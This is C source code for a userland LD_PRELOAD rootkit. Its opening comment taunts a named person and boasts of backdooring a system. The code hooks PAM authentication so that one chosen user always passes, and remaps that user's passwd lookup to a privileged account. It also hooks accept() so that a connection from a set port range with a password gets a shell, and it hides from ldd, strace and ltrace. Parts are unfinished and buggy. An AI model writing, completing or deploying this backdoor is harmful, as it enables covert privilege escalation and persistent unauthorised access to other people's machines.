/*
    If you are reading this, N, then stop fucking stalking me and leeching off my rep mate.
    I'm writing a userland rootkit mate, even though I don't root. Cheers.

        [*] If not su'ing SU_USER, hook real functions, so they still function normally.
        [*] Gets passwd entry for JACK_USER if su'ing SU_USER (pwd.h contains the passwd struct definition, or see man page)
        [*] Wraps PAM functions handling authentication (found via ltrace) -> returns PAM_SUCCESS for SU_USER/PAM_USER (authenticates without question)

    Will add more shit when I get my pegasus.
    Already fucked your system mate, just "su h0h0" and -3 get fucked.
*/

#define  _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <pwd.h>
#include <security/pam_appl.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <dlfcn.h>
#include <stdlib.h>
#include <stdbool.h>
#include <pty.h>
#include <utmp.h>    // login_tty() -- may not need later.
#include "config.h"
#include "libcalls.h"

#ifdef DEBUG
    #define debug(fmt, ...) fprintf(stderr, fmt, ##__VA_ARGS__)
#else
    #define debug(fmt, ...) /* Not debugging. */
#endif

/* Non-hooks: */
void init(void) __attribute__((constructor));
void fini(void) __attribute__((destructor));
void drop_shell(int fd);
int watchdog(char *name);

void init(void)
{
    int i;
    FILE *handle;
    char *caller = NULL;
    size_t len = 0;

    if((handle = fopen("/proc/self/cmdline", "r")))
    {
        while(getdelim(&caller, &len, 0, handle) != -1)
        {
            if(watchdog(caller))
            {
                // Unload the library.
                break;
            }
        }

        free(caller);
        fclose(handle);
    }

    /* Initialise: pointers to libc functions. */
    for(i = 0; i < num_libcalls; i++)
        libcalls[i].callback = dlsym(RTLD_NEXT, libcalls[i].name);

    debug("init() done.\n");
}

void fini(void)
{
    // Cleanup.
    debug("fini() done.\n");
}

void drop_shell(int fd)
{
    int master, slave;
    pid_t pid;
    char *argv[] = {SHELL_PATH, "-c", "echo 1234 > /tmp/hehe.txt", NULL};
    char pty_name[13];    // /proc/sys/kernel/pty/max generally <= 4 chars.
    char *test = "echo 123 > /tmp/456.txt\n";

    debug("drop_shell(): forkpty() called.\n");
    pid = forkpty(&master, pty_name, NULL, NULL);

    dprintf(fd, "Master FD: %d\n", master);
    dprintf(fd, "Current FD: %d\n", fd);

    if(pid == -1)
        dprintf(fd, "fork() error.");
    else if(pid == 0)
    {
        // dup2(master, STDOUT_FILENO);
        // dup2(master, STDERR_FILENO);

        debug("drop_shell(): dropping shell.\n");
        execv(argv[0], argv);
    }
    else if(pid > 0)
    {
/*        if(write(master, test, strlen(test)) == -1)
            dprintf(fd, "write() error.\n");
        else
            dprintf(fd, "write() okay.\n"); */
    }

/*    if(openpty(&master, &slave, pty_name, NULL, NULL) == 0)
    {
        if((pid = fork()) == 0)
        {
            if(login_tty(slave) == 0)
                execv(argv[0], argv);
        }
        else if(pid > 0)
        {
            dup2(master, STDIN_FILENO);
            dup2(master, STDOUT_FILENO);
            dup2(master, STDERR_FILENO);
        }
    } */

    close(master);
//    close(slave);

    debug("drop_shell() done.\n");
}

int watchdog(char *name)
{
    size_t i, wd_size;
    const char *watchdogs[] = \
    {
        "/usr/bin/ldd",
        "strace",
        "ltrace"
    };

    wd_size = sizeof watchdogs / sizeof watchdogs[0];

    for(i = 0; i < wd_size; i++)
    {
        if(strcmp(watchdogs[i], name) == 0)
        {
            debug("watchdog(): busted (%s).\n", name);
            return true;
        }
    }

    return false;
}

/* PAM hooks: */
int getpwnam_r(const char *name, struct passwd *pwd, char *buf, size_t buflen, struct passwd **result)
{
    libcall orig_getpwnam_r = getlibcall("getpwnam_r");

    if(strcmp(SU_USER, name) == 0)
        return orig_getpwnam_r(JACK_USER, pwd, buf, buflen, result);

    return orig_getpwnam_r(name, pwd, buf, buflen, result);
}

struct passwd *getpwnam(const char *name)
{
    char buf[1024];
    struct passwd *pwd = malloc(sizeof(struct passwd));
    struct passwd **result = malloc(sizeof(struct passwd *));

    getpwnam_r(name, pwd, buf, sizeof(buf), result);  
    return pwd;
}

int pam_authenticate(pam_handle_t *pamh, int flags)
{
    libcall orig_pam_authenticate = getlibcall("pam_authenticate");
    const void *item;

    pam_get_item(pamh, PAM_USER, &item);

    debug("item: %s\n", item);
    if(strcmp(SU_USER, item) == 0)
        return PAM_SUCCESS;

    return orig_pam_authenticate(pamh, flags);
}

int pam_acct_mgmt(pam_handle_t *pamh, int flags)
{
    libcall orig_pam_acct_mgmt = getlibcall("pam_authenticate");
    const void *item;

    pam_get_item(pamh, PAM_USER, &item);

    if(strcmp(SU_USER, item) == 0)
        return PAM_SUCCESS;

    return orig_pam_acct_mgmt(pamh, flags);
}

/* accept() hook/backdoor */
int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)
{
    libcall orig_accept = getlibcall("accept");
    const size_t pass_len = strlen(SHELL_PASS);
    char password[pass_len];
    unsigned short int port;
    int retfd;

    password[pass_len] = '\0';

    retfd = orig_accept(sockfd, addr, addrlen);
    port  = ntohs(((struct sockaddr_in *) addr)->sin_port);

    if(port >= LOW_PORT && port <= HIGH_PORT)
    {
        debug("accept(): ready for password: ");
        read(retfd, password, pass_len);

        if(strcmp(password, SHELL_PASS) == 0)
            drop_shell(retfd);
    }

    return retfd;
}
